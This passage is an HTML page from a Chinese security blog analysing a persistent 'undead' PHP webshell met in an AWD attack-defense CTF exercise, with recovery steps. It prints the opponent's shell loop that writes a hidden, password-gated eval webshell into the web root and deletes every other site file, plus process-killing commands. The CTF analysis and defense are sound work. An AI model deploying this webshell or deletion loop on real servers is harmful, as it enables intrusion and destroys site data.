@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>AWD不死马分析 | Polo&#39;s Blog</title>
+  <meta name="description" content="前言最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。 场景一 :先手不死马权限维持对手不死马内容如下： 123sh -c while true;do echo &amp;#x27;&lt;?php $key&#x3D;$_POST[&quot;key&quot;];$keyhash&#x3D;md5($key);if($keyhash&#x3D;&#x3D;&#x3D;&quot;ce3abf96f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD不死马分析">
+<meta property="og:url" content="https://polosec.github.io/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="前言最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。 场景一 :先手不死马权限维持对手不死马内容如下： 123sh -c while true;do echo &amp;#x27;&lt;?php $key&#x3D;$_POST[&quot;key&quot;];$keyhash&#x3D;md5($key);if($keyhash&#x3D;&#x3D;&#x3D;&quot;ce3abf96f">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cdn.polowong.top/image-20230701182147014.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20230701185159366.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20230701185411193.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20230701190316490.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20230701192308062.png">
+<meta property="article:published_time" content="2023-07-01T12:16:14.000Z">
+<meta property="article:modified_time" content="2023-07-01T12:16:17.173Z">
+<meta property="article:author" content="Polo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/image-20230701182147014.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://polosec.github.io/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/polosec" target="_blank">
+          <img class="img-circle img-rotate" src="http://cdn.polowong.top/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Polo</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer&amp;Cybersec Researcher</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>null</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wp/">wp</a><span class="category-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0307xctf/" rel="tag">0307xctf</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensic/" rel="tag">forensic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meiyacup/" rel="tag">meiyacup</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rdg/" rel="tag">rdg</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%96%E8%AF%81/" rel="tag">取证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" rel="tag">红队技能</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/0307xctf/" style="font-size: 13.33px;">0307xctf</a> <a href="/tags/awd/" style="font-size: 13.5px;">awd</a> <a href="/tags/buu/" style="font-size: 13.5px;">buu</a> <a href="/tags/buuoj/" style="font-size: 13.5px;">buuoj</a> <a href="/tags/c/" style="font-size: 13px;">c++</a> <a href="/tags/ctf/" style="font-size: 13px;">ctf</a> <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 13px;">c语言</a> <a href="/tags/forensic/" style="font-size: 13px;">forensic</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/linux/" style="font-size: 13.17px;">linux</a> <a href="/tags/meiyacup/" style="font-size: 13px;">meiyacup</a> <a href="/tags/misc/" style="font-size: 13.83px;">misc</a> <a href="/tags/mysql/" style="font-size: 13.17px;">mysql</a> <a href="/tags/php/" style="font-size: 13.67px;">php</a> <a href="/tags/rdg/" style="font-size: 13.33px;">rdg</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 13px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13.17px;">内网渗透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13px;">反序列化</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size: 13px;">取证</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 13.17px;">密码学</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 13px;">杂项</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 13px;">流量分析</a> <a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" style="font-size: 13px;">红队技能</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 13.17px;">网络</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">16</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/" class="title">AWD不死马分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-07-01T12:16:14.000Z" itemprop="datePublished">2023-07-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/11/14/%E5%9B%9B%E5%B7%9D%E7%9C%81%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-AWD%E9%83%A8%E5%88%86WriteUp/" class="title">四川省信息安全技术大赛 AWD部分WriteUp</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-11-14T13:52:55.000Z" itemprop="datePublished">2022-11-14</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/10/23/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-ez-forensic/" class="title">2022巅峰极客_ez_forensic</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-10-23T14:52:26.000Z" itemprop="datePublished">2022-10-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/10/16/BUGKU-PAR-%E5%BA%94%E6%80%A5%E5%8A%A0%E5%9B%BA/" class="title">BUGKU PAR 应急加固</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-10-16T12:30:17.000Z" itemprop="datePublished">2022-10-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/10/16/Flask%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%B8%85%E9%99%A4/" class="title">Flask内存马的检测与清除</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-10-15T16:59:21.000Z" itemprop="datePublished">2022-10-16</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-AWD不死马分析" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      AWD不死马分析
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/" class="article-date">
+	  <time datetime="2023-07-01T12:16:14.000Z" itemprop="datePublished">2023-07-01</time>
+	</a>
+</span>
+        
+        
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 5(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在练习AWD的时候遇到了一个很棘手的不死马，功能主要就是删站，于是本文对该不死马进行分析并寻找对策。</p>
+<h1 id="场景一-先手不死马权限维持"><a href="#场景一-先手不死马权限维持" class="headerlink" title="场景一 :先手不死马权限维持"></a>场景一 :先手不死马权限维持</h1><p>对手不死马内容如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c while true;do echo &#x27;&lt;?php $key=$_POST[&quot;key&quot;];$keyhash=md5($key);if($keyhash===&quot;ce3abf96f10611c4b801d70568d200a6&quot;) &#123;eval($_POST[&quot;a&quot;]);&#125;echo&quot;file not find.&quot;; ?&gt;&#x27; &gt; /var/www/html/.edd300324dab8fa4799151d7c11952c4.php;find /var/www/html -not -name &quot;.edd300324dab8fa4799151d7c11952c4.php&quot; -not -name &quot;rsa.php&quot; -delete;chmod 700 /var/www/html/.edd300324dab8fa4799151d7c11952c4.php;chmod 700 /tmp/g;sleep 1;done;</span><br><span class="line">sh -c &#x27;while true; do &#123; echo &quot;&lt;?php $key=$_POST[\&quot;key\&quot;];$keyhash=md5($key);if($keyhash===\&quot;ce3abf96f10611c4b801d70568d200a6\&quot;) &#123;eval($_POST[\&quot;a\&quot;]);&#125; echo \&quot;file not find.\&quot;; ?&gt;&quot; &gt; /var/www/html/.edd300324dab8fa4799151d7c11952c4.php; find /var/www/html -not -name \&quot;.edd300324dab8fa4799151d7c11952c4.php\&quot; -not -name \&quot;rsa.php\&quot; -delete; chmod 700 /var/www/html/.edd300324dab8fa4799151d7c11952c4.php; chmod 700 /tmp/g; sleep 1; &#125; done;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先给自己服务器www-data权限在web根目录上个不死马</p>
+<p><img src="http://cdn.polowong.top/image-20230701182147014.png" alt="image-20230701182147014"></p>
+<p>但是这里有个问题，直接访问shell是404，除了game路由和index其他任何文件/目录访问都是404，第一反应可能是apache配置问题，但是apache配置在AWD环境中无法修改，感觉要考虑htaccess问题。htaccess代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># Some servers require this option to be enabled</span><br><span class="line">Options -MultiViews</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">    RewriteEngine On</span><br><span class="line"></span><br><span class="line">    # Uncomment two lines below to redirect all non-www traffic to www</span><br><span class="line">    # Make sure your baseurl config is set to www. domain</span><br><span class="line">    # RewriteCond %&#123;HTTP_HOST&#125; !^www\. [NC]</span><br><span class="line">    # RewriteRule ^(.*)$ http:&#x2F;&#x2F;www.%&#123;HTTP_HOST&#125;&#x2F;$1 [R&#x3D;301,L]</span><br><span class="line"></span><br><span class="line">    # Uncomment two lines below to redirect all non-secure traffic to https:&#x2F;&#x2F;</span><br><span class="line">    # Make sure you enabled HTTPS in Dashboard &#x2F; System &#x2F; System in Subrion CMS</span><br><span class="line">    # RewriteCond %&#123;HTTPS&#125; off</span><br><span class="line">    # RewriteRule (.*) https:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125; [R&#x3D;301,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteCond %&#123;REQUEST_URI&#125; !(.*)\.(.*)$</span><br><span class="line">    RewriteRule ^(.+[^&#x2F;])$ http:&#x2F;&#x2F;%&#123;HTTP_HOST&#125;%&#123;REQUEST_URI&#125;&#x2F; [L,R&#x3D;301]</span><br><span class="line">    RewriteRule ^(game)($|&#x2F;) - [L]</span><br><span class="line">    # Return default not-found as it&#39;s faster</span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule \.(jpg|jpeg|png|gif|bmp|ico|swf|js|css|woff|ttf)$ - [NC,R&#x3D;404,L]</span><br><span class="line"></span><br><span class="line">    # Google sitemap controller</span><br><span class="line">    RewriteRule ^(tmp&#x2F;)?sitemap.xml$ tmp&#x2F;sitemap.xml [L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; -f</span><br><span class="line">    RewriteRule ^(.*)(\.php([0-9]*)|\.json|\.xml|\.tpl|\.phtml|\.ini|\.inc|&#x2F;)$ index.php?_p&#x3D;$1 [NC,QSA,L]</span><br><span class="line"></span><br><span class="line">    RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">    RewriteRule ^(.*)$ index.php?_p&#x3D;$1 [QSA,L]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_deflate.c&gt;</span><br><span class="line">    &lt;IfModule mod_setenvif.c&gt;</span><br><span class="line">        &lt;IfModule mod_headers.c&gt;</span><br><span class="line">            SetEnvIfNoCase ^(Accept-EncodXng|X-cept-Encoding|X&#123;15&#125;|~&#123;15&#125;|-&#123;15&#125;)$ ^((gzip|deflate)\s*,?\s*)+|[X~-]&#123;4,13&#125;$ HAVE_Accept-Encoding</span><br><span class="line">            RequestHeader append Accept-Encoding &quot;gzip,deflate&quot; env&#x3D;HAVE_Accept-Encoding</span><br><span class="line">        &lt;&#x2F;IfModule&gt;</span><br><span class="line">    &lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">    &lt;IfModule mod_filter.c&gt;</span><br><span class="line">        AddOutputFilterByType DEFLATE \</span><br><span class="line">            text&#x2F;html text&#x2F;plain text&#x2F;xml text&#x2F;css text&#x2F;javascript text&#x2F;xml \</span><br><span class="line">            application&#x2F;xml application&#x2F;xhtml+xml application&#x2F;rss+xml \</span><br><span class="line">            application&#x2F;javascript application&#x2F;x-javascript application&#x2F;json \</span><br><span class="line">            font&#x2F;opentype application&#x2F;x-font-ttf font&#x2F;eot \</span><br><span class="line">            image&#x2F;x-icon image&#x2F;vnd.microsoft.icon image&#x2F;svg+xml image&#x2F;svg+xml</span><br><span class="line">    &lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">    &lt;IfModule mod_mime.c&gt;</span><br><span class="line">        AddEncoding gzip svgz</span><br><span class="line">    &lt;&#x2F;IfModule&gt;</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过向gpt查询可以知道自己上传的任何文件都会被当作传入index.php中，所以直接先把这个删了</p>
+<p><img src="http://cdn.polowong.top/image-20230701185159366.png" alt="image-20230701185159366"></p>
+<p>然后再次访问自己上传的不死马，成功</p>
+<p><img src="http://cdn.polowong.top/image-20230701185411193.png" alt="image-20230701185411193"></p>
+<p>下面模拟对手运行上面的shell命令</p>
+<p><img src="http://cdn.polowong.top/image-20230701190316490.png" alt="image-20230701190316490"></p>
+<p>现在已经是被删站的状态了，所有文件都无法落地。</p>
+<p>现在由于先手种植了webshell，所以还有主机www-data权限</p>
+<h2 id="恢复主机"><a href="#恢复主机" class="headerlink" title="恢复主机"></a>恢复主机</h2><p>在蚁剑中，还是可以使用shell的，首先考虑把www-data用户的apache进程kill掉,这里需要注意，必须是www-data用户才可以，<strong>也就是必须通过先手种的内存马执行命令</strong>,通过下面命令可以kill www-data用户的所有进程，同时清除内存马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 -1</span><br><span class="line">kill &#96;ps -ef | grep apache2 | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;</span><br></pre></td></tr></table></figure>
+
+<p>最后删除对手的php文件，恢复对主机的控制，并将网站备份文件还原</p>
+<p><img src="http://cdn.polowong.top/image-20230701192308062.png" alt="image-20230701192308062"></p>
+<h1 id="场景二：彻底失去主机权限"><a href="#场景二：彻底失去主机权限" class="headerlink" title="场景二：彻底失去主机权限"></a>场景二：彻底失去主机权限</h1><p>该场景对应于没有先手落地不死马，即被攻陷后直接被删站，无法落地文件。</p>
+<p>我的评价是寄，开局好好修吧。</p>
+<h1 id="延申"><a href="#延申" class="headerlink" title="延申"></a>延申</h1><p>RSA不死马 参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4640#toc-3">https://xz.aliyun.com/t/4640#toc-3</a> ，暂未复现</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>Article Link</strong>
+      <p style="width: 100%;
+  word-wrap: break-word;
+  word-break: break-all;
+  overflow: hidden;">https://polosec.github.io/2023/07/01/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E5%88%86%E6%9E%90/</p>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>Copyright Notice: </strong> All articles in this blog, unless otherwise stated, are under the<a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external"> CC BY 4.0 CN agreement</a>.Reprint please indicate the source!
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/polosec" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="http://cdn.polowong.top/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
